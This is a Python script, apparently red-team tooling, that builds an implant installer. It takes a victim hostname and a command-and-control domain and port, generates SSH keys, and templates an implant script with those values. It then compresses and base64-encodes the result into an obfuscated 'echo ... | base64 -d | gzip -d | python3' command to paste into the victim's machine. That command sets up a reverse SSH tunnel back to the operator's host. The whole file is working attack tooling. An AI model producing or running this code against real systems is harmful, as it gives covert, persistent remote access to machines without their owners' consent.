#!/usr/bin/env python3
# Copyright (c) 2023, Oracle and/or its affiliates.

import os
import pathlib
import sys
import base64
import io  # Replace StringIO
import gzip
import re
import tempfile

logging = True


def usage():
    print(f"usage: {sys.argv[0]} <username> <victim_hostname> <c2_fqdn> <port>")
    sys.exit(1)


def templify(template, replacements):
    out = template
    for k, v in replacements.items():
        out = out.replace(k, v)
    return out


def getfile(path):
    with open(path, "r") as f:
        return f.read()


def nocomments(stuff):
    nc = re.sub('#.*$', '', stuff, 0, re.M)
    o = ""
    for line in nc.splitlines(True):
        if line.strip():
            if not logging and "log" in line:
                continue
            o += line
    return o


def gzbase(stuff):
    out = io.BytesIO()  # Replace with BytesIO for binary data
    with gzip.GzipFile(fileobj=out, mode="wb") as f:
        f.write(nocomments(stuff).encode())
    return base64.b64encode(out.getvalue()).decode('utf-8')


def main():
    if len(sys.argv) < 5:
        usage()
    if os.getuid() != 0:
        sys.stderr.write("you must use sudo\n")
        sys.exit(1)

    username = sys.argv[1]
    victim_hostname = sys.argv[2]
    fqdn = sys.argv[3]
    port = sys.argv[4]

    print(f"[*] username: {username}")
    print(f"[*] victim hostname: {victim_hostname}")
    print(f"[*] fqdn: {fqdn}")
    print(f"[*] port: {port}")

    script_template = getfile(os.path.join(sys.path[0], "install_implant.py"))
    pathlib.Path('/opt/backflips/keys/').mkdir(parents=True, exist_ok=True)
    keypath = f"/opt/backflips/keys/{username}-{victim_hostname}-{fqdn}"
    print(f"[*] keypath: {keypath}")
    print("[*] generating keypair")
    os.system(f"ssh-keygen -t rsa -b 2048 -C '' -q -f '{keypath}' -N ''")
    print("[*] adding to flip's authorized keys")
    os.system(f"cat '{keypath}.pub' >> /opt/backflips/authorized_keys")

    pubkey = base64.b64encode(getfile(keypath + ".pub").encode()).decode('utf-8')
    privkey = base64.b64encode(getfile(keypath).encode()).decode('utf-8')
    implant_py = getfile(os.path.join(sys.path[0], "implant.py"))
    implant = templify(implant_py, {
        "PORT_PLACEHOLDER": port,
        "FQDN_PLACEHOLDER": fqdn
    })

    replacements = {
        "PRIVATE_KEY_PLACEHOLDER": privkey,
        "PUBLIC_KEY_PLACEHOLDER": pubkey,
        "PORT_PLACEHOLDER": port,
        "FQDN_PLACEHOLDER": fqdn,
        "IMPLANT_PLACEHOLDER": gzbase(implant)
    }

    script = templify(script_template, replacements)
    gzbased = gzbase(script)
    cmd = f"echo '{gzbased}'|base64 -d|gzip -d|python3"
    print("[+] paste the following into the victim")
    print(cmd)
    with tempfile.NamedTemporaryFile(delete=False, mode='w') as f:  # mode='w' for writing strings
        f.write(cmd)
    print(f"[+] This is also available to you in the file {f.name}")
    print(f"[*] Once this tunnel is up run: ../install_autossh_backflip.py {port} PROXYPORT {keypath}")


if __name__ == "__main__":
    main()
